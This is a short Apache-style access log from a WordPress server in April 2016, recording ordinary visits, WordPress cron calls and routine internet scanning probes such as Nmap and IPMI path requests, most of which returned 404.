185.25.148.240 - - [12/Apr/2016:03:32:20 +0000] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 455 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
66.249.93.152 - - [12/Apr/2016:04:00:17 +0000] "GET / HTTP/1.1" 200 5889 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
52.31.166.88 - - [12/Apr/2016:04:00:17 +0000] "POST /wp-cron.php?doing_wp_cron=1460433617.1944758892059326171875 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
141.212.122.161 - - [12/Apr/2016:08:56:10 +0000] "GET / HTTP/1.1" 301 274 "-" "Go http package"
141.212.122.161 - - [12/Apr/2016:08:56:11 +0000] "GET / HTTP/1.1" 200 5833 "http://52.31.166.88:80" "Go http package"
54.160.83.139 - - [12/Apr/2016:11:13:34 +0000] "GET / HTTP/1.1" 200 15625 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)"
74.91.18.44 - - [12/Apr/2016:18:51:55 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
52.31.166.88 - - [12/Apr/2016:18:51:55 +0000] "POST /wp-cron.php?doing_wp_cron=1460487115.7509229183197021484375 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
69.30.226.222 - - [12/Apr/2016:20:48:08 +0000] "GET / HTTP/1.1" 200 15606 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
60.217.72.16 - - [12/Apr/2016:23:15:57 +0000] "GET / HTTP/1.0" 200 15577 "-" "-"
60.217.72.16 - - [12/Apr/2016:23:15:57 +0000] "\x16\x03\x01\x01(\x01" 400 0 "-" "-"
13.82.58.15 - - [13/Apr/2016:00:41:58 +0000] "GET /xmlrpc.php HTTP/1.1" 200 268 "-" "-"
13.82.58.15 - - [13/Apr/2016:00:41:58 +0000] "GET /feed/ HTTP/1.1" 404 440 "-" "-"
52.31.166.88 - - [13/Apr/2016:00:41:58 +0000] "POST /wp-cron.php?doing_wp_cron=1460508118.3448989391326904296875 HTTP/1.0" 200 187 "-" "WordPress/4.0.10; http://52.31.166.88"
115.148.166.185 - - [13/Apr/2016:02:58:10 +0000] "GET / HTTP/1.0" 200 15577 "-" "-"
59.174.44.54 - - [13/Apr/2016:02:58:10 +0000] "GET /stats HTTP/1.1" 404 496 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)"
59.174.44.108 - - [13/Apr/2016:02:58:10 +0000] "GET / HTTP/1.0" 200 15577 "-" "-"
111.162.153.23 - - [13/Apr/2016:02:58:11 +0000] "GET /status HTTP/1.1" 404 497 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
175.17.208.134 - - [13/Apr/2016:02:58:12 +0000] "GET /stauts HTTP/1.1" 404 497 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
211.97.123.93 - - [13/Apr/2016:02:58:12 +0000] "GET /IPMIdevicedesc.xml HTTP/1.1" 404 509 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
123.157.193.104 - - [13/Apr/2016:02:58:12 +0000] "GET /PSBlock HTTP/1.1" 404 498 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
